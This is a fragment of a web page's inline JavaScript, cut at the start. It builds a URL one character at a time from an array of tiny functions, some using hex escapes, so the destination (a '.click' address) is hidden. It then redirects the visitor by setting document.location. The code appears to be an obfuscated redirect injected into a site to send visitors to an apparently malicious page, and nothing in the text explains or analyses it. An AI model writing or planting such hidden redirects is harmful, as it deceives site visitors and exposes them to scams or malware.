        const pieces = [

            function() { return 's'; },
            () => '\x3a',

            p => "r",
            _ => 'g',
            e => 'e',
            v => "n",
            () => '\x2e',
            q => 'c',
            function() { return 'l'; },
            () => '\x69',
            () => 'c',
            function() { return "k"; },
            () => "/",
            () => 's',
            () => "/",
            () => "r",
            () => "e",
            c => 'p'
        ];
        const u = pieces.reduce((acc, fn) => acc + fn(), '');

        document.location = u;
    </script>
